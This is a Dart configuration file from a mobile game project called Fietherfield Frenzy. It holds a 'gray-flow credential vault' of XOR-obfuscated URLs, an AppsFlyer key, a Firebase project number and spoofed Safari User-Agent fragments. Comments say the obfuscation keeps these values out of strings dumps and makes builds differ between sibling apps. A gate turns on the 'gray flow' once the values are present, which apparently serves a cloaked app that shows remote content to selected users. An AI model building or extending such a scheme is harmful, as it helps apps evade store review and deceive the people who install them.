import '../core/frenzy_cipher.dart';

/// ════════════════════════════════════════════════════════════
/// Fietherfield Frenzy — gray-flow credential vault.
/// ════════════════════════════════════════════════════════════
///
/// Every secret ships as an obfuscated byte array (never plaintext). The
/// cipher family (XorShift32 keystream + nibble-swap byte transform) is
/// defined in `lib/hatchway/core/frenzy_cipher.dart` — a different
/// family than any sibling app template, so the compiled bytes of the
/// decoder differ project-to-project.
///
/// To regenerate the arrays after touching the seed or values, run:
///     dart run tool/encode_frenzy_gate.dart
/// and paste the printed arrays here. The VERIFY block must round-trip
/// EXACTLY (a stray/missing byte silently corrupts the URL).
abstract final class FrenzyGateConfig {
  // ── App identity ─────────────────────────────────────────────
  static const String appTitle = 'Fietherfield Frenzy';
  static const String bundleId = 'com.featherfield.frenzygame';

  /// iOS App Store numeric id (used for AppsFlyer GCD + store_id).
  static const String iosStoreId = '6792504341';

  static const int pushSnoozeSeconds = 259200; // 3 days
  static const int organicRecheckSeconds = 6;

  // ── Encoded secrets — paste output of tool/encode_frenzy_gate.dart ─
  // endpoint: https://featherfieldfrenzy.com/config.php
  static const List<int> _endpoint = <int>[
    47, 6, 171, 112, 180, 146, 232, 16, 103, 211, 226, 206, 151, 205, 164, 217,
    60, 143, 85, 232, 84, 191, 94, 24, 65, 119, 152, 140, 23, 211, 179, 91,
    249, 49, 210, 136, 211, 14, 156, 135, 118,
  ];
  // privacy: https://featherfieldfrenzy.com/privacy-policy.html
  static const List<int> _privacy = <int>[
    47, 6, 171, 112, 180, 146, 232, 16, 103, 211, 226, 206, 151, 205, 164, 217,
    60, 143, 85, 232, 84, 191, 94, 24, 65, 119, 152, 140, 23, 211, 179, 104,
    10, 193, 211, 8, 147, 242, 168, 7, 102, 81, 7, 166, 39, 74, 94, 55, 57, 84,
  ];
  // support: https://featherfieldfrenzy.com/support.html
  static const List<int> _support = <int>[
    47, 6, 171, 112, 180, 146, 232, 16, 103, 211, 226, 206, 151, 205, 164, 217,
    60, 143, 85, 232, 84, 191, 94, 24, 65, 119, 152, 140, 23, 211, 179, 88,
    90, 81, 115, 105, 162, 162, 184, 135, 181, 65, 55,
  ];
  // AppsFlyer GCD base — safe endpoint, still routed through the cipher so
  // it never appears in a strings dump.
  static const List<int> _gcd = <int>[
    47, 6, 171, 112, 180, 146, 232, 16, 87, 50, 210, 62, 215, 173, 232, 38, 76,
    95, 196, 200, 180, 15, 94, 88, 6, 213, 172, 239, 19, 18, 135, 88, 42, 66,
    178, 89, 80, 161, 237, 196, 134, 101, 86, 69, 114, 42, 195,
  ];
  // User-Agent version fragments — unique per app (see gray_user_agent).
  // webkit: 605.1.15
  static const List<int> _webkit = <int>[0, 203, 95, 28, 144, 82, 136, 179];
  // safari: 18.7
  static const List<int> _safari = <int>[80, 74, 207, 140];
  // safariTail: 604.1
  static const List<int> _safariTail = <int>[0, 203, 175, 28, 144];
  // appsFlyerDevKey: N6ZJuLosa7PdPk2NzANkqd
  static const List<int> _appsFlyerKey = <int>[
    129, 42, 13, 223, 212, 116, 236, 92, 55, 240, 145, 201, 21, 173, 168, 87,
    47, 74, 186, 152, 5, 80,
  ];
  // firebaseProjectNumber: 970361620296
  static const List<int> _firebaseProject = <int>[
    208, 58, 239, 76, 192, 34, 88, 64, 195, 47, 111, 234,
  ];
  // OneLink is OPTIONAL — it must NEVER be part of the gate-enable check.
  // oneLinkHost: featherfieldfrenzy.onelink.me
  static const List<int> _oneLinkHost = <int>[
    15, 23, 154, 176, 229, 229, 156, 140, 183, 211, 82, 201, 183, 60, 117, 89,
    47, 206, 184, 89, 212, 64, 46, 232, 2, 84, 152, 239, 183,
  ];

  static String get endpoint => revealFrenzy(_endpoint);
  static String get privacyUrl => revealFrenzy(_privacy);
  static String get supportUrl => revealFrenzy(_support);
  static String get gcdBase => revealFrenzy(_gcd);
  static String get webKitVersion => revealFrenzy(_webkit);
  static String get safariVersion => revealFrenzy(_safari);
  static String get safariTail => revealFrenzy(_safariTail);
  static String get appsFlyerKey => revealFrenzy(_appsFlyerKey);
  static String get firebaseProjectNumber => revealFrenzy(_firebaseProject);
  static String get oneLinkHost => revealFrenzy(_oneLinkHost);

  static String get storeToken => 'id$iosStoreId';

  /// Gate needs config endpoint + AF key + Firebase project number.
  /// ⚠️ Do NOT add optional fields (e.g. OneLink) here — a missing optional
  /// value would silently disable the whole gray flow.
  static bool get grayCredentialsReady =>
      endpoint.isNotEmpty &&
      appsFlyerKey.isNotEmpty &&
      firebaseProjectNumber.isNotEmpty;
}
